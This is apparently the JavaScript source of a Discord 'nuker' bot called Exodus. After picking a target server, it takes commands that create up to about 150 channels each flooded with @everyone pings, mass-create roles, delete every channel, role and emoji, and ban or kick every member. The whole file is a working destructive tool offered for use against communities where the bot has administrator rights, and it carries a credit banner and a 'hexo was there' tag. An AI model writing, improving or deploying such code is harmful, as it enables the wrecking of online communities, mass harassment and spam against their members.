/* 
    original script developed by @AnonHexo#3411
    find more tools at github.com/AnonHexo
    don't be gay and leave the credits ;)
*/

console.clear()

const Discord = require("discord.js")
const client = new Discord.Client()
const c = require('colors/safe');
const rd = require('readline-sync');
require('dotenv').config()

const app = {
    'token': 'YOUT_TOKEN_HERE',
    'prefix': 'dot',
    'mex': 'hexo was there'
}

const banner = () => {
    console.log(String.raw `



    ▓█████ ▒██   ██▒ ▒█████  ▓█████▄  █    ██   ██████     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
    ▓█   ▀ ▒▒ █ █ ▒░▒██▒  ██▒▒██▀ ██▌ ██  ▓██▒▒██    ▒     ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
    ▒███   ░░  █   ░▒██░  ██▒░██   █▌▓██  ▒██░░ ▓██▄      ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
    ▒▓█  ▄  ░ █ █ ▒ ▒██   ██░░▓█▄   ▌▓▓█  ░██░  ▒   ██▒   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
    ░▒████▒▒██▒ ▒██▒░ ████▓▒░░▒████▓ ▒▒█████▓ ▒██████▒▒   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
    ░░ ▒░ ░▒▒ ░ ░▓ ░░ ▒░▒░▒░  ▒▒▓  ▒ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
     ░ ░  ░░░   ░▒ ░  ░ ▒ ▒░  ░ ▒  ▒ ░░▒░ ░ ░ ░ ░▒  ░ ░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
       ░    ░    ░  ░ ░ ░ ▒   ░ ░  ░  ░░░ ░ ░ ░  ░  ░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
       ░  ░ ░    ░      ░ ░     ░       ░           ░              ░    ░     ░  ░      ░  ░   ░     
                              ░                                                                      


                                                by @AnonHexo#3411
`)
}
const success = `${c.red("[")}+${c.red("]")}`
const error = `${c.red("[")}-${c.red("]")}`
const question = `${c.red("[")}?${c.red("]")}`
const info = `${c.red("[")}!${c.red("]")}`
const loading = `${c.red("[")}...${c.red("]")}`
const list = `${c.red("[")}#${c.red("]")}`

var serverList = ''
var targetServer = ''
var ts = ''

client.once('ready', () => {
    try {
        banner()
        console.log(c.red('           ════════════════════════════════════════════════════════════════════════════════'))
        console.log(c.blue(`                                      Logged in as: ${client.user.tag}`))
        console.log(c.blue(`                                      Prefix: ${app.prefix}`))
        console.log(c.blue(`                                      Permission Required: ADMINISTRATOR`))
        console.log(c.red('           ════════════════════════════════════════════════════════════════════════════════'))
        console.log("")
        console.log(`${loading} ${c.yellow(`Fetching servers...`)}`)

        client.guilds.cache.forEach((guild) => {
            serverList += `${list} ${guild.name} - ${guild.id} - ${client.guilds.cache.get(guild.id.toString()).memberCount} members\n`
        })
        setTimeout(() => {
            console.log(`${success} ${c.green(`Fetched informations:\n${c.white(serverList)}`)}`)
            ts = rd.question(`${question} Enter target server ID: `).toString()
            if (ts == null || ts == undefined || ts == '') {
                return console.log(`${error} Invalid server ID, try again.`)
            }
            targetServer = client.guilds.cache.get(ts)

            console.clear()
            banner()
            console.log(`${info} ${c.gray(`Selected target server: ${c.magenta(targetServer.name)}`)}`)
            client.user.setActivity({
                type: "PLAYING",
                name: `exodus ready @ ${targetServer.name}`
            })
            console.log(`${success} ${c.gray(`Exodus ready to nuke server, check bot status.`)}\n\n`)
            readyStatus = true
        }, 1500)

    } catch (err) {
        console.error(`${error} ${c.red(`An error occurred: ${err}`)}`)
    }
})

client.on('message', async (message) => {
    if (!message.guild || !readyStatus || !message.guild.id == targetServer.id || !message.guild.me.hasPermission('ADMINISTRATOR')) return console.error(`${error} ${c.red(`Setup error.`)}`)

    if (message.content == `${app.prefix} massch`) {
        for (var i = 0; i < 150; i++) {
            message.guild.channels.create('reckt by ' + message.author.username)

            for (var i = 0; i < 150; i++) {
                let channels = message.guild.channels.create('reckt by ' + message.author.username)

                channels.then(
                    function (channel, index) {
                        for (var i = 0; i < 150; i++) {
                            channel.send('@everyone ' + app.mex)
                            console.log((`${info} ${c.yellow(`Channel ${channel.name} Created & Pinged!`)}`))
                        }
                    }
                );

            }
        }
    }

    if (message.content == `${app.prefix} massrole`) {
        for (let i = 0; i <= 100; i++) {
            message.guild.roles.create({
                data: {
                    name: `${app.mex}`,
                    position: i++,
                    color: "RANDOM"
                }
            }).then((role) => {
                console.log((`${info} ${c.yellow(`Role ${role.name} Created!`)}`))
            })
        }
    }

    if (message.content == `${app.prefix} delch`) {
        message.guild.channels.cache.forEach((ch) => {
            ch.delete().then((channel) => {
                console.log((`${info} ${c.red(`Channel ${channel.name} Deleted!`)}`))
            })
        })
    }

    if (message.content == `${app.prefix} massban`) {
        message.guild.members.cache.forEach(member => member.ban({
            reason: `${app.mex}`
        }).then(console.log(`${info} ${c.red(`${member.tag} banned!`)}`)))
    }

    if (message.content == `${app.prefix} masskick`) {
        message.guild.members.cache.forEach(member => member.kick({
            reason: `${app.mex}`
        }).then(console.log(`${info} ${c.red(`${member.tag} kicked!`)}`)))
    }

    if (message.content == `${app.prefix} delroles`) {
        message.guild.roles.cache.forEach((role) => {
            if (message.guild.me.roles.highest.position > role.position) {
                role.delete(`app.mex`).then(console.log(`${info} ${c.red(`Role ${role.name} deleted!`)}`))
            }
        })
    }

    if (message.content == `${app.prefix} delemoji`) {
        message.guild.emojis.cache.forEach(e => e.delete({
            reason: `${app.mex}`
        }).then(console.log(`${info} ${c.red(`Emoji ${emoji.name} deleted!`)}`)))
    }

})


client.login(app.token).catch(console.error)
